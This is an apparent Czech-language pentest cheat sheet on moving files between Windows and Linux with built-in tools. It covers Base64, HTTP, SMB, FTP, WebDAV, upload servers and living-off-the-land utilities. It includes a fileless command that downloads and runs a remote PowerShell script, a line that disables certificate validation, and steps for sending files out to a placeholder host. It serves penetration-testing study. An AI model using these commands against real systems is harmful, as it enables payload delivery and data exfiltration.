# Windows File Transfer (Cheat Sheet)

Cíl:

- přenos souborů mezi Windows ↔ Linux
- využití vestavěných nástrojů
- ověření integrity souborů

---

# 1. PowerShell Base64

Použití:

- malé soubory
- bez síťového připojení

Linux:

```
cat soubor | base64 -w 0
```

Windows:

```
[IO.File]::WriteAllBytes(
"C:\cesta\soubor.exe",
[Convert]::FromBase64String("BASE64")
)
```

Kontrola:

Linux:

```
md5sum soubor
```

Windows:

```
Get-FileHash soubor -Algorithm MD5
```

---

# 2. HTTP/HTTPS Download

Nejčastější metoda.

## WebClient

```
(New-Object Net.WebClient).DownloadFile(
'http://IP/soubor.exe',
'C:\Users\Public\soubor.exe'
)
```

---

## Fileless spuštění

```
IEX (New-Object Net.WebClient).DownloadString(
'http://IP/script.ps1'
)
```

---

## Invoke-WebRequest

```
iwr http://IP/soubor.exe -OutFile soubor.exe
```

Problémy:

```
-UseBasicParsing
```

SSL bypass:

```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
```

---

# 3. SMB Transfer (Port 445)

Linux server:

```
sudo impacket-smbserver share /tmp/share -smb2support
```

Windows:

```
copy \\IP\share\soubor.exe .
```

S přihlášením:

```
net use \\IP\share /user:test heslo
```

---

# 4. FTP Transfer (Port 21)

Linux FTP server:

```
sudo python3 -m pyftpdlib --port 21 --write
```

Windows script:

```
echo open IP > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET soubor.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

---

# 5. WebDAV (HTTP místo SMB)

Použití:

- když je blokovaný port 445
- povolený HTTP/80

Linux:

```
sudo wsgidav \
--host=0.0.0.0 \
--port=80 \
--root=/tmp \
--auth=anonymous
```

Windows:

```
copy soubor.zip \\IP\DavWWWRoot\
```

---

# 6. Upload z Windows → Linux

Linux server:

```
python3 -m uploadserver
```

Windows:

```
Invoke-FileUpload `
-Uri http://IP:8000/upload `
-File C:\data.zip
```

---

# Living Off The Land

Windows má vlastní nástroje pro přenos:

|Nástroj|Účel|
|---|---|
|certutil|Download/encode|
|bitsadmin|Background transfer|
|PowerShell WebClient|HTTP download|
|Invoke-WebRequest|HTTP download|

---

# Pentest Checklist

☐ Jaké porty dovoluje firewall?  
☐ Funguje HTTP/HTTPS download?  
☐ Je blokované SMB?  
☐ Kontrola AV/EDR omezení  
☐ Použití vestavěných nástrojů  
☐ Ověření hashů po přenosu